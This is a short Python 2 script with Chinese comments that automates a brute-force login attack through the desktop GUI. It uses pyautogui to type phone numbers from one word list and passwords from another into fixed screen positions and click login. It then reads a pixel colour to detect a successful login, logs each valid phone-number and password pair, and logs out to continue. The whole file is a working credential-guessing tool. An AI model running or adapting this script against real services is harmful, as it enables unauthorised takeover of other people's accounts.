#!/usr/bin/python
#coding:utf-8
#auth:Devotes

import pyautogui

f=open('phone-burp.txt','r')
f1=open('log.txt','a')
f2=open('password.txt','r')
#当出现异常情况时可以移动鼠标到左上角中止程序
pyautogui.FAILSAFE = True

listname=[]
listpassword=[]
for m in f:
	listname.append(m.strip('\n\r'))
for n in f2:
	listpassword.append(n.strip('\n\r'))

for a in listpassword:
	a=a.strip('\r\n')
	pyautogui.doubleClick(326, 332) #双击密码输入框
	pyautogui.press('backspace')  #清除内容
	pyautogui.click(326, 332)   #点击密码输入框
	pyautogui.typewrite(a)   #输入密码
	f1.write('[-]burp password is '+a+'\n\r')
	for i in listname:
		pyautogui.doubleClick(350, 272)  #手机号  双击输入框
		pyautogui.press('backspace')   #清除内容
		pyautogui.click(350, 272)    #点击输入框
		pyautogui.typewrite(i.strip('\n\r'))   #输入用户名
		pyautogui.click(462, 448,interval=1)    #点击登录
		f1.write('[-]user is '+i.strip('\n\r')+' password is'+a+'\n\r')  #写入日志
		img = pyautogui.screenshot()
		(r,g,b)=img.getpixel((394, 152))
		#print str(r)
		if r==254:
			print '[*]'+i.strip('\n\r')+'password is '+a
			f1.write('\n\r'+'[*]'+i.strip('\n\r')+'password is '+a)
			pyautogui.click(368, 273)  #选择团队
			pyautogui.click(24, 134)   #点击菜单栏
			pyautogui.click(61, 384,interval=0.5)   #点击设置
			pyautogui.click(310, 420)  #点击退出登陆
			pyautogui.click(639, 404)   #点击确认退出

			pyautogui.doubleClick(350, 272)  #点击手机号用户名输入框
			pyautogui.typewrite('test1111111')  #输入账号
			pyautogui.click(326, 332)   #点击密码输入框
			pyautogui.typewrite('123456')  #输入密码
			pyautogui.click(462, 448,interval=0.5)   #点击登陆
f.close
f1.close
f2.close
		


